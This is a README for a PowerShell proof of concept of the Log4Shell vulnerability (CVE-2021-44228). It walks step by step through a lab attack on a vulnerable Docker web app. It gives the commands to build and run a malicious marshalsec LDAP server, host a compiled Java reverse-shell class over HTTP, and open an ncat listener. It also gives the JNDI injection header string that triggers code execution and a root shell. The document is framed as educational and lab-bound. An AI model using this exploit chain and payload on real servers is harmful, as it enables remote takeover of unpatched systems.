# Log4PowerShell (CVE-2021-44228) Proof of Concept

A Proof-Of-Concept for the CVE-2021-44228 vulnerability written in PowerShell.

This PowerShell script starts multiple processes (netcat listener, malicious LDAP and HTTP server, and a vulnerable web app hosted from a Docker image).
For educational purposes, this script runs through the entire exploit chain, dynamically creating the Java exploit class and ultimately producing a reverse shell on the web server.
The poisoned header sent to the vulnerable web application also triggers the information disclosure aspect of the vulnerability. The variable (Java version) can be observed in the LDAP server logs.

## LOG4SHELL THREAT BRIEF

https://medium.com/@alex.fronteddu/log4shell-threat-brief-dd771e831ff9

![log4jattack](https://user-images.githubusercontent.com/6628565/147063652-47c39470-1f53-49c5-806a-0f1ffa1abb7e.png)

## Proof of Concept

The script Log4jPoC.ps1 automates the exploit locally on a Windows machine.

### Demo

https://user-images.githubusercontent.com/6628565/147061440-9e3dd81f-cbef-48a5-af93-fd36203a45e4.mp4

## Requirements

The requirement for Maven may be removed in the future if the pre-compiled LDAP server is included in the project.
For transparency I cloned the repo and built it from source.

- Docker for Desktop
- Java 8
- Maven
- Python3
- Internet connectivity (docker image pull, git clone)

## Usage

`.\Log4ShellPoC.ps1`

When prompted, enter your computers local IP. This is used to configure the listening address of the tools as well as the target address of the vulnerable web app container. If all the dependencies are met, this should be it. The script will start spinning up console windows with everything you need to carry out the attack. Keep your eye on the ncat.exe to see the reverse shell connect.

## About this script

### Dependency Check

The script will attempt to check the dependencies.
If all dependencies are met it will start building the exploit payload (Java reverse shell).

### Exploit Payload

The payload in this example is a simple java based reverse shell.
When executed by the vulnerable web server it will establish a connection to our ncat listener.
I have included a copy of openjdk version `1.8.0_41` specifically to compile the payload for maximum compatibility.

### Docker Target

The next step is to launch the Docker container:

`ghcr.io/christophetd/log4shell-vulnerable-app`

This container hosts a Spring Boot web application using `Log4j 2.14.1` running in a `Java 1.8.0_181` environment.
The Java version is important since our exploit payload cannot be compiled with a Java version higher than what is installed on the server.

This project can be found here: https://github.com/christophetd/log4shell-vulnerable-app

Thanks christophetd!

### LDAP Server

Once the server is up we have to move onto the LDAP server.
I am using marshalsec's object deserialization vulnerability project which can be found here:

https://github.com/mbechler/marshalsec

Thank you mbechler!

We really only need the LDAPRefServer.java file but ive included the entire project in this iteration.
The only modification needed is the listening port:

`(Get-Content .\java\marshalsec\src\main\java\marshalsec\jndi\LDAPRefServer.java).Replace('int port = 1389;' , "int port = $ldapPort;") | Set-Content .\java\marshalsec\src\main\java\marshalsec\jndi\LDAPRefServer.java -ErrorAction Stop`

A simple find and replace works.

Lets build the project with Maven:

`mvn clean package -DskipTests`

Next we run project and run it with some arguments:

`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://$lhost:$httpFilePort/exploit/#Exploit`

The last bit configures the callback URI that will be passed to the vulnerable server when it contacts this server using the JDNI API. The LDAPRefServer.java has some string manipulation that will append `.class` to the end of Exploit.

In the end the resulting URI will look something like this:
`http://{IP}}:{PORT}}/exploit/Exploit.class`

### Netcat Listener

Once we have the malicious LDAP server up and running we move on to the netcat listener.
This is simply: `.\tools\ncat.exe -lvn {PORT}}`

Netcat will allow us to receive the TCP connection from the vulnerable server and interact with it.

### HTTP Server

Next, we need HTTP server to server up the payload we created earlier.

`python -m http.server $httpFilePort`

When the vulnerable servers follows the URI provided by the LDAP server it will download Exploit.class and execute it.
This should establish a connection with the netcat listener and give us access to the server as the user who is running the web app. In this case root.. Always run your applications as a user with the lowest permissions possible.

### Web Request

Now we have to acutally send a request to the vulnerable web server to kick everything off. In this exapmple it will be a GET request with an 'X=Api-Version' header containg the following string `${jndi:ldap://{IP}}:{PORT}}/${java:version}}`
For this example the header is doing two things.
Firstly, `${jndi:ldap://{IP}}:{PORT}}` tells the Log4j service to connect to a LDAP server.
Secondly, `/${java:version}` will cause the environment variable containing the Java version to be included in the request to the LDAP server. This can be useful for troubleshooting an payload that is not working. If the payload is compiled with a version of Java higher than what is installed on the server it will not work.

## Conclusion

At this point everything should have been spun up and you should see a shell in the netcat window.
Go ahead and type `whoami` to see the effective username of the current user. In this case root!
Notice the log messages displayed in the docker container. You should see messages indicating a connection to a remote server, the netcat listener.

Hopefully this helps clarify how this vulnerability is exploited.

## Attribution

_Christophetd - log4shell-vulnerable-app Docker Image_

https://github.com/christophetd/log4shell-vulnerable-app

_Marshalsec object deserialization vulnerability project_

https://github.com/mbechler/marshalsec
